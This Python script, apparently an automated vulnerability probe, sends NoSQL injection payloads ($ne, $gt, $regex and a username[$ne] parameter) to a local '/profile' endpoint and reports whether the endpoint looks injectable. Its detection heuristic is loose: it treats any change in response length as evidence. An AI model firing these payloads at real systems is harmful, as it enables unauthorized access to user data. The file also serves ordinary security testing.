#!/usr/bin/env python3
import requests
import json
import sys

def exploit():
    # Initialize result structure
    result = {
        "vulnerability_id": "profile-nosql-injection-query",
        "target_url": "http://localhost:3000",
        "test_endpoint": "/profile",
        "vulnerability_exists": False,
        "confidence": "low",
        "evidence": [],
        "error": None
    }
    
    base_url = "http://localhost:3000"
    endpoint = "/profile"
    
    try:
        # Test 1: Baseline request to understand normal behavior
        print("Testing baseline request...", file=sys.stderr)
        baseline_url = f"{base_url}{endpoint}"
        baseline_response = requests.get(baseline_url, timeout=10)
        baseline_status = baseline_response.status_code
        baseline_length = len(baseline_response.text)
        
        result["evidence"].append({
            "test": "baseline",
            "url": baseline_url,
            "status_code": baseline_status,
            "response_length": baseline_length,
            "response_preview": baseline_response.text[:200]
        })
        
        # Test 2: NoSQL injection with $ne operator (primary payload)
        print("Testing NoSQL injection with $ne operator...", file=sys.stderr)
        nosql_payload = '{"$ne":null}'
        nosql_url = f"{base_url}{endpoint}?query={nosql_payload}"
        nosql_response = requests.get(nosql_url, timeout=10)
        nosql_status = nosql_response.status_code
        nosql_length = len(nosql_response.text)
        
        result["evidence"].append({
            "test": "nosql_ne_injection",
            "url": nosql_url,
            "payload": nosql_payload,
            "status_code": nosql_status,
            "response_length": nosql_length,
            "response_preview": nosql_response.text[:200]
        })
        
        # Test 3: NoSQL injection with username parameter
        print("Testing NoSQL injection with username parameter...", file=sys.stderr)
        username_payload_url = f"{base_url}{endpoint}?query={nosql_payload}&username[$ne]=null"
        username_response = requests.get(username_payload_url, timeout=10)
        username_status = username_response.status_code
        username_length = len(username_response.text)
        
        result["evidence"].append({
            "test": "nosql_username_injection",
            "url": username_payload_url,
            "status_code": username_status,
            "response_length": username_length,
            "response_preview": username_response.text[:200]
        })
        
        # Test 4: NoSQL injection with $gt operator
        print("Testing NoSQL injection with $gt operator...", file=sys.stderr)
        gt_payload = '{"$gt":""}'
        gt_url = f"{base_url}{endpoint}?query={gt_payload}"
        gt_response = requests.get(gt_url, timeout=10)
        gt_status = gt_response.status_code
        gt_length = len(gt_response.text)
        
        result["evidence"].append({
            "test": "nosql_gt_injection",
            "url": gt_url,
            "payload": gt_payload,
            "status_code": gt_status,
            "response_length": gt_length,
            "response_preview": gt_response.text[:200]
        })
        
        # Test 5: NoSQL injection with $regex operator
        print("Testing NoSQL injection with $regex operator...", file=sys.stderr)
        regex_payload = '{"$regex":".*"}'
        regex_url = f"{base_url}{endpoint}?query={regex_payload}"
        regex_response = requests.get(regex_url, timeout=10)
        regex_status = regex_response.status_code
        regex_length = len(regex_response.text)
        
        result["evidence"].append({
            "test": "nosql_regex_injection",
            "url": regex_url,
            "payload": regex_payload,
            "status_code": regex_status,
            "response_length": regex_length,
            "response_preview": regex_response.text[:200]
        })
        
        # Analysis: Check for vulnerability indicators
        print("Analyzing responses for vulnerability indicators...", file=sys.stderr)
        
        # Look for different response lengths or status codes
        response_lengths = [baseline_length, nosql_length, username_length, gt_length, regex_length]
        status_codes = [baseline_status, nosql_status, username_status, gt_status, regex_status]
        
        # Check if any payload produced different response length (potential data extraction)
        length_variations = len(set(response_lengths)) > 1
        
        # Check if any payload produced different status codes
        status_variations = len(set(status_codes)) > 1
        
        # Check for error messages that might indicate NoSQL injection
        error_keywords = ["mongodb", "mongo", "bson", "objectid", "syntax error", "invalid", "malformed"]
        error_found = False
        
        for evidence in result["evidence"]:
            response_text = evidence.get("response_preview", "").lower()
            for keyword in error_keywords:
                if keyword in response_text:
                    error_found = True
                    evidence["error_keyword_found"] = keyword
                    break
        
        # Check for successful data extraction indicators
        data_keywords = ["user", "profile", "email", "_id", "username", "data"]
        data_found = False
        
        for evidence in result["evidence"][1:]:  # Skip baseline
            response_text = evidence.get("response_preview", "").lower()
            if any(keyword in response_text for keyword in data_keywords) and evidence["status_code"] == 200:
                data_found = True
                evidence["potential_data_extraction"] = True
        
        # Determine vulnerability existence and confidence
        if error_found:
            result["vulnerability_exists"] = True
            result["confidence"] = "high"
            result["reason"] = "Database error messages detected indicating NoSQL injection vulnerability"
        elif data_found and length_variations:
            result["vulnerability_exists"] = True
            result["confidence"] = "medium"
            result["reason"] = "Different response lengths and potential data extraction detected"
        elif length_variations or status_variations:
            result["vulnerability_exists"] = True
            result["confidence"] = "low"
            result["reason"] = "Response variations detected, possible NoSQL injection"
        else:
            result["vulnerability_exists"] = False
            result["confidence"] = "low"
            result["reason"] = "No clear indicators of NoSQL injection vulnerability found"
            
    except requests.exceptions.RequestException as e:
        result["error"] = f"Network error: {str(e)}"
        result["vulnerability_exists"] = False
        result["confidence"] = "unknown"
        
    except Exception as e:
        result["error"] = f"Unexpected error: {str(e)}"
        result["vulnerability_exists"] = False
        result["confidence"] = "unknown"
    
    return result

if __name__ == "__main__":
    result = exploit()
    print(json.dumps(result, indent=2))